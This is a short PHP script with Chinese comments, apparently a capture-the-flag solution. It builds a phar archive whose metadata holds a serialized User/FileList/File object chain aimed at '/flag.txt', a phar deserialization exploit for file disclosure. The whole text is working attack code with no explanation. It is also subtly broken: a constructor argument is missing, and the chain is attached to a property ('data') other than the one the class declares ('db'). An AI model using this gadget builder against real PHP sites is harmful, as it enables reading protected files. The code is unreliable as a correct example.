<!--phar-->
<?php

class User {
    public $db;
}

class File{
    public $filename;
}

class FileList{
    private $files;
    public function __construct($path)
    {
        $file = new File();
        $file->filename = '/flag.txt';
        $this->files = array($file);
    }
}

$a = new User();
$a->db = new FileList();

@unlink("phar.phar");
$phar = new Phar("phar.phar"); //后缀名必须为phar
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
$o = new User();
$o -> data= new FileList();
$phar->setMetadata($o); //将自定义的meta-data存入manifest
$phar->addFromString("test.txt", "test"); //添加要压缩的文件
//签名自动计算
$phar->stopBuffering();